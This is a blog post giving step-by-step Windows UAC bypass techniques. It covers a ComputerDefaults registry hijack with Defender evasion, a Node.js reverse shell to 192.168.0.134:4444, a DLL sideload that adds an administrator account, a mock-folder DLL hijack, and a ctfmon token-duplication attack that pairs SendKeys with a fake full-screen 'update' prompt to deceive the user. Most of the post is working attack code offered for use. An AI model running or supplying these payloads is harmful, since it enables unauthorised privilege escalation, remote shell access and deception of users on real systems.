---
title:  "Creative UAC Bypass Methods for the Modern Era"
header:
  teaser: "/assets/images/ctfmon_uac.png"
categories:
  - Privilege Escalation
tags:
  - UAC Bypass
  - privilege escalation
  - Windows 11
  - '2024'
  - ctfmon
  - UI Access
  - token manipulation
---

It's been almost a year since my last post, and during that time I have acquired a strong interest in revisiting privilege escalation techniques for the modern era 😸
My goal is always to find code that executes across all Windows versions **AND** bypasses EDR. In fact, when I write these blog posts, I test all the code with EDR on to ensure everything is fully tested before I share my findings.  

Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.  

> Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:

***UAC Bypass - Revisiting an old technique! (Detection Status: Undetected)***
-

We're going to be revisiting a tried and true UAC Bypass method that still works just fine as of writing this post, 3/20/2025.  (Microsoft if you're reading this I'm on to you!)  I thought to myself,"Windows Defender can't be blocking all these classic UAC bypass methods."  Sure enough, their filters aren't that impressive.  We're going to be working with the `ComputerDefaults.exe` executable in the `C:\Windows\System32` directory.  Here's how it works:

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "[yourexecutable or command]" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

This parameter is what Windows Defender scrutinizes the most: `-Value "[yourexecutable or command]"`

If you do: `-Value "notepad"`, Defender is super chill and loves you.  

If you do: `-Value "cmd"`...

![image](https://github.com/user-attachments/assets/708e3c65-cbe9-48dd-bd80-f032d4cb840d)

How about: `-Value "C:\Users\Public\something.exe"`...

![image](https://i.ytimg.com/vi/3CqCq5RtrJo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAqFuuJ8vitOjfCsrPgPFKUxxhiYQ)

So...What if we do.... `-Value "../../myfolder/barney.exe"`

![image](https://github.com/user-attachments/assets/a10b248b-f5af-424b-a042-f8ba2439201a)

![image](https://media0.giphy.com/media/5y8sRBYSWWb16/giphy.gif?cid=6c09b9522xxdays2x4v6zjs6o5y3oejjfsd40rac1du7g9j4&ep=v1_gifs_search&rid=giphy.gif&ct=g)

It's as simple as that my friends.  Don't include Drive letters, Don't include popular payload locations like `c:\users\public` and `c:\temp`.  Just go with the old school ..\\..\\ routine and avoid all that altogether and convince Defender that you are in the right.  Right?! 😸

Also I should mention, the ..//..// goes from c:\windows\system32 -> c:\ root directory.  Just create a folder of your choosing and place your .exe in it.

All that's left now is to issue the final statement: 

`Start-Process "C:\Windows\System32\ComputerDefaults.exe"` and we're off to the races!  Your .exe file you placed in the `Value` parameter will be executed without Defender yelling at you.

I should probably also show you what I did as far as my payload goes.  I kept it really simple.  `barney.exe` is just a simple C++ loader.  This is for demo purposes of course.  In a realistic pentest scenario, you'd be substituting your actual C2 implant in the `Value` field:

```cpp

#include <windows.h>

int main()
{
    WinExec("c:\\users\\public\\n0de.exe c:\\users\\public\\elevationstation.js", 0);
}
```

Compile that and move it to the folder you designated in your powershell `Value` field/parameter.

Next up, I'll explain the Node stuff.  `N0de.exe` is literally the renamed Node.JS binary I downloaded as a portable from the Node.js site.  I always use node for pentest engagements as it's a friendly living off the land binary and seems to remain undetected.  Node then opens this .js file, which is my reverse shell:

```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("cmd.exe", []);
var client = new net.Socket();
client.connect(4444, "192.168.0.134", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/;
})();
```

Bring it all together and you get the following:

![image](https://github.com/user-attachments/assets/c2fa9794-a33a-4b6b-a9c0-b6a7f0b5c7ca)

![image](https://github.com/user-attachments/assets/872b4dcf-94f2-439c-a30c-8df6c75b2101)

Final code:

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

And there you have it.  An age old UAC Bypass technique that still works, still bypasses UAC and STILL EVADES DEFENDER!  The irony is it's easier than all the other methods I posted last year.
Think smarter not harder I guess.  Okay, I feel better about this blog post now.  I couldn't sit idly by while folks found this page and were likely immediately disappointed because none of the techniques I shared were still relevent.  Now there's at least one 😙  Until next time!

<hr>

> Everything below this line is deprecated as far as anything > Windows 11 22h2.  I'd assume OSes < Windows 11 22H2 are still game 😸
<hr>
***UAC Bypass Technique #1 - DLL Sideloading<br>(UAC setting - ALWAYS ON)***
-

> ***This is now deprected as of sometime in early 2025 ***

This one isn't too challenging to pull off, though it proved difficult locating a consistent DLL in use across all Windows 11 versions (home/pro/education/enterprise). I'm talking about the ever famous scheduled task, `SilentCleanup`, which of course runs: `cleanmgr.exe / dismhost.exe`. This scheduled task has been abused time and time again over the years, and somehow it still prevails as a tried and true vector for UAC bypass / privilege escalation to this day.
![image](https://github.com/user-attachments/assets/59d2143f-492c-4454-a041-c450dcac815a)

If we go ahead and run this scheduled task, we'll see we have a stray DLL from `dismhost.exe` desperately looking to be intercepted via a DLL Sideloading attack 🤯  That stray DLL is called: `api-ms-win-core-kernel32-legacy-l1.dll`

![image](https://github.com/user-attachments/assets/92ebb2ad-fec3-480c-8ed0-57667c54a477)

Let's fire up Visual Studio and write some code to load our own custom dll. I went a bit overboard and made sure, if at all possible, to prevent the DLL from getting load locked.
You'll see I add a new user, mocker, and join them to the administrators group.  I also write a text file to the c:\ directory for added confirmation of our new privileges.

```c
#include "pch.h"
#include <windows.h>

#pragma comment (lib, "user32.lib")

DWORD WINAPI MyThread(LPVOID lpParam)
{
    WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);
    WinExec("cmd.exe /c echo hey > c:\\heythere.txt", 0);
    return 0;
}


DWORD WINAPI WorkItem(LPVOID lpParam)
{
    MyThread(NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);  // Avoid unnecessary notifications

        // Use QueueUserWorkItem to safely execute code after the DLL has been loaded
        QueueUserWorkItem(WorkItem, NULL, WT_EXECUTEDEFAULT);

        // Optionally execute additional code here, e.g., WinExec command
        // WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Now, let's compile it and add it into our **USER** environment **PATH** folder of our choosing. I made my own to prove you do **NOT** need a premade PATH folder to use this.  Sometimes DLL sideloading attacks, especially **SYSTEM** processes with DLL sideloading opportunities, require a **PATH** location that's already been created.  If there aren't any **PATH** locations created, you're out of luck.  Not in this case.  This attack vector uses the **USER** path location, which we have full control over as a standard user.

![image](https://github.com/user-attachments/assets/b7582201-e55b-4bb0-86a8-9d25c36f3054)

and here it is after compilation has completed, in my PATH folder of choice:

![image](https://github.com/user-attachments/assets/91e1bb7a-0213-4ed8-946b-7496ad15f297)

Now, let's fire up that scheduled task again and see what happens shall we?! 🤞

![image](https://github.com/user-attachments/assets/f5fba616-3ed2-4228-aa2a-afa5cdefef5f)

It's loaded!  That's no guarantee it worked though...let's check to make sure our new user was created, as well as our text file.  
Sure enough, there's the newly created administrator 😸

![image](https://github.com/user-attachments/assets/6857aef0-68ac-41be-abfd-96952c9ba9ba)

and the text file:

![image](https://github.com/user-attachments/assets/7eab66a9-c43a-4492-914d-1eae20763d02)

OKAY!  we're in business.  **HOWEVER**, there is a caveat to this bypass and the other two I'll be covering...they do **NOT** work with the upcoming `User Account Control Administrator Protection`:

[https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/](https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/)

Trust me, I tried... 😿  But until then, this particular bypass works even with UAC set to ALWAYS ON.  

***UAC Bypass Technique #2 - Mock Trusted Folders<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
-

> **UPDATE: 3/18/2025 - This no longer appears to work on the latest Windows 11 (v24H2), possibly 23H2 as well.**

This particular technique, just like the last one we discussed, is not anything novel.  It's actually been around for quite some time.  I personally discovered it through reading a Bleeping Computer article last year on it:

[https://www.bleepingcomputer.com/news/security/old-windows-mock-folders-uac-bypass-used-to-drop-malware/
](https://www.bleepingcomputer.com/news/security/old-windows-mock-folders-uac-bypass-used-to-drop-malware/)

It's pretty simple really.  We find an auto-elevate executable in c:\Windows\System32 and force it to load our own custom dll.  The interesting aspect of this particular bypass is that the auto elevated executable can only load a DLL if it's contained within the trusted C:\Windows\System32 folder.  We get around this using the mock trusted folder technique.  In brief, when you create a mock folder, the folder includes a trailing space, for instance: `c:\windows \`

In our case, we need to create `c:\windows \system32\`.  This works, as I understand it, because of the following which I swiped from an excellent Medium writeup by David Wells: [https://medium.com/@CE2Wells](https://medium.com/@CE2Wells)

I edited some of this to reflect the executable we're using in this blog post:

> "When this awkward path is sent to AIS for an elevation request, the path is passed to **GetLongPathNameW**, which converts it back to “**C:\Windows\System32\easinvoker.exe**” (space removed). Perfect! This is now the string that trusted directory checks are performed against (using RtlPrefixUnicodeString) for the rest of the routine. The beauty is that after the trusted directory check is done with this converted path string, it is then freed, and rest of checks (and final elevated execution request) are done with the original executable path name (with the trailing space)" - David Wells

Okay, let's choose our autoexecutable. I'll go with `easinvoker.exe`

![image](https://github.com/user-attachments/assets/4003ee7f-1754-474c-bba6-d386d8a2f558)

Now, we need to take care of a few things first.  We need to make sure to include the proper import(s) for our DLL when we load it using easinvoker.exe
I don't want to have to deal with tons of imported APIs, so I'd like to find a DLL that has just one or two.  We'll use the free WinAPISearch64 program to get the job done!
I'll go with the `netutils.dll` DLL file since it only has the 1 imported API:

![image](https://github.com/user-attachments/assets/a0fc0c77-d7e4-48fa-801d-23aee338ea7d)

Next, I need to understand how that API is laid out.  I'll check it out on Microsoft's site:

![image](https://github.com/user-attachments/assets/f9306112-f7b1-4c1f-aaf7-df25bbca94cd)

![image](https://github.com/user-attachments/assets/2ee4eb1b-fa93-481e-be39-653c7dba4625)

cool, let's put it all together: 

```c
//x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll
#include <windows.h>
#include <lm.h>
#include <wtypes.h>

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            WinExec("cmd.exe", 1); 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
NET_API_STATUS WINAPI NetApiBufferFree(LPVOID Buffer)
{
        Sleep(INFINITE);
        return 1;
}
```

compile it (I sometimes use Debian Linux for DLLs. In this case, I had some weird issues with using Visual Studio so just stuck with mingw)

~$ `x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll`

Lastly, put together some crappy code that pulls off the UAC Bypass

```bat
@echo off
cd %USERPROFILE%\Desktop
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
copy "c:\windows\system32\easinvoker.exe" "C:\Windows \System32\"
cd c:\temp
copy "netutils.dll" "C:\Windows \System32\"
"C:\Windows \System32\easinvoker.exe"
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32\"
rmdir "C:\Windows \"
cd %USERPROFILE%\Desktop
```

and be greeted with a beautiful administrator command prompt 😼

![image](https://github.com/user-attachments/assets/bcf9dd38-c8a3-4e5d-b53c-9c5c55a36920)

and that's it!  

Now, time for the grand finale 🙂  I had the most fun with this one, as it's the most creative and consequently the most difficult to learn and pull off...at least for me personally.  But that's what made it all the more enjoyable to research!  I give you...

***UAC Bypass Technique #3 - UI Access Token Duplication<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
-

> **UPDATE: 3/18/2025 - This seems to have been patched sometime in late Fall, 2024**

Yeah, on it's own `ctfmon` seems pretty bland.  It's not fully elevated, though it is running in HIGH integrity.  So I'll give it that

![image](https://github.com/user-attachments/assets/dbb926c8-6f88-4a20-8e39-f01b60b6046b)

Let's peek around a bit more to see what's up with this intriguing yet lackluster process. Hmm, ever wondered about this when viewing a process in Process Hacker/System Informer?

![image](https://github.com/user-attachments/assets/0f8789c3-fe0b-4a3c-b35b-a36116e3a8f3)

I never really thought much of it.  But then again, others delve much deeper into Windows Internals than I have.  Take James Forshaw for example...keep in mind this was from 2019!!!

[https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html](https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html)

I'll give you the short end of the matter.  We can duplicate the ctfmon's process token and change the token integrity to the integrity of our current process.  Then, we have Leet powers to do an old trick I used to absolutely LOVE doing back in high school.  Using SendKeys to force elevated programs to do our evil bidding...Mwuahahahahahaa!  Normally, well.. sometime after Windows XP...a standard user was prevented from interacting with an elevated application window.  However, with UIAccess, welcome back to the days of Windows XP and 7, where AV sucks and there are no restrictions...where anything goes!  It's starting to get late so I'd better get to it.  Here's the code:

```c
#include <windows.h>
#include <iostream>
#include <string>

// Helper function to adjust token integrity
bool SetTokenIntegrityLevel(HANDLE hTokenTarget, HANDLE hTokenSource) {
    DWORD dwSize = 0;
    TOKEN_MANDATORY_LABEL* pTILSource = nullptr;

    // Get the integrity level of the current process token
    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, nullptr, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "Failed to get token integrity level size: " << GetLastError() << std::endl;
        return false;
    }

    pTILSource = (TOKEN_MANDATORY_LABEL*)malloc(dwSize);
    if (!pTILSource) {
        std::cerr << "Memory allocation failed.\n";
        return false;
    }

    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, pTILSource, dwSize, &dwSize)) {
        std::cerr << "Failed to get token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    // Set the integrity level for the target token
    if (!SetTokenInformation(hTokenTarget, TokenIntegrityLevel, pTILSource, dwSize)) {
        std::cerr << "Failed to set token integrity level: " << GetLastError() << std::endl;
        free(pTILSource);
        return false;
    }

    free(pTILSource);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: <program> <PID of ctfmon.exe>" << std::endl;
        return 1;
    }

    DWORD targetPID = std::stoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        std::cerr << "Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        std::cerr << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hCurrentProcessToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurrentProcessToken)) {
        std::cerr << "Failed to open current process token: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        std::cerr << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Set the integrity level to match the current process
    if (!SetTokenIntegrityLevel(hNewToken, hCurrentProcessToken)) {
        std::cerr << "Failed to set integrity level: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Prepare to create a new process with UIAccess
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    WCHAR commandLine[] = L"powershell.exe";
    // Create the process with UIAccess
    if (!CreateProcessAsUser(hNewToken,
        nullptr,
        commandLine, // Replace with your desired process
        nullptr,
        nullptr,
        FALSE,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
        nullptr,
        nullptr,
        &si,
        &pi)) 
    {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        CloseHandle(hNewToken);
        CloseHandle(hCurrentProcessToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Process created with PID: " << pi.dwProcessId << std::endl;

    // Clean up
    CloseHandle(hNewToken);
    CloseHandle(hCurrentProcessToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

compile it, and then run it:

![image](https://github.com/user-attachments/assets/469b1d72-0a8c-4959-a313-f4960dea967b)

Now, check your newly created powershell process' token privs!

![image](https://github.com/user-attachments/assets/2ce24dd4-406b-4bf4-81a1-3929c4e998ae)

Let's get creative 😸  We can now sendkeys to an elevated program.  So, let's start an autoelevated program we'd like to use to gain administrator privs, say...`taskschd.msc` !

I'm going to use a powershell script to pull this off.  This is actually pretty hilarious.  I made it so it covers the entire screen green with a message telling the user to hit enter and press yes if prompted (In case UAC always on is set)
covering the whole screen with a form only works best if the victim is on a laptop of course.  I'll see if I can capture screenshots of the madness below.  Here's the code:

```ps1
$UACRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

$UACValue = Get-ItemProperty -Path $UACRegKeyPath -Name ConsentPromptBehaviorAdmin | Select-Object -ExpandProperty ConsentPromptBehaviorAdmin

switch ($UACValue) {
    0 { "0 - UAC is disabled (Never notify)." }
    1 { "1 - UAC enabled - Prompt for credentials on the secure desktop (Always notify)." }
    2 { "2 - UAC enabled - Prompt for consent on the secure desktop." }
    3 { "3 - UAC enabled - Prompt for consent for non-Windows binaries." }
    4 { "4 - UAC enabled - Automatically deny elevation requests." }
	5 { "5 - UAC enabled - Prompt for consent for non-Windows binaries." }
    Default { "Unknown UAC setting." }
}


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = [System.Drawing.Color]::Green
$form.TopMost = $true

$form.KeyPreview = $true

$form.Add_KeyDown({
    param($sender, $eventArgs)
    
    if ($eventArgs.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
        $sender.Close()  
    }
})

$form.Add_Paint({
    param($sender, $event)
    
    $graphics = $event.Graphics
    
    $text = "[ Please hit (Enter) then select (YES) if prompted to continue the update ]"
    
    $font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
    $brush = [System.Drawing.Brushes]::White

    $textSize = $graphics.MeasureString($text, $font)

    $x = ($form.ClientSize.Width - $textSize.Width) / 2
    $y = ($form.ClientSize.Height - $textSize.Height) / 2

    $graphics.DrawString($text, $font, $brush, $x, $y)
})

$form.Show()

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
}
"@

Start-Process "cmd.exe" -ArgumentList "/C start taskschd.msc" -NoNewWindow

Start-Sleep -Seconds 5

$taskschd = Get-Process -Name "mmc" -ErrorAction SilentlyContinue

if ($taskschd) {
    
    $hwnd = $taskschd.MainWindowHandle
	
    [User32]::SetForegroundWindow($hwnd)
    
    # Wait a moment for the window to come to the front
    Start-Sleep -Seconds 2

    # Send keystrokes to azman/mmc
    [void][System.Windows.Forms.SendKeys]::SendWait("%")
	[void][System.Windows.Forms.SendKeys]::SendWait("{RIGHT}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
    [void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
    [void][System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
	Start-Sleep -Seconds 2
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait("{TAB}")
	[void][System.Windows.Forms.SendKeys]::SendWait(" ")
	Start-Sleep -Seconds 1
	[void][System.Windows.Forms.SendKeys]::SendWait("cmd{ENTER}")
} else {
    Write-Host "taskschd/mmc is not running."
}

     $form.Close()
```

It cracks me up because this is all happening behind the scenes and when the green screen goes away, the payload will have executed and the user wouldn't have seen it...well...if they were only using one screen lol

Here's screenshots of the process unfolding:

![IMG_5171](https://github.com/user-attachments/assets/6af7748b-6978-44d1-87dc-76061ac17ad6)

I Literally had to take a picture of my computer monitor with my IPhone so you guys could see the results 😄
and the final administrator command shell!  You would obviously want to weaponize this to perform a reverse shell, etc.  But for demonstration purposes I wanted you to see the administrator shell.

![image](https://github.com/user-attachments/assets/c7f1baca-cc9f-4553-bc85-48251841250c)

It's getting late and I need to hop off.  Hope you enjoyed the fresh take on some old tried and true UAC bypass techniques.  Until next time, and hopefully not one year from now...Later!
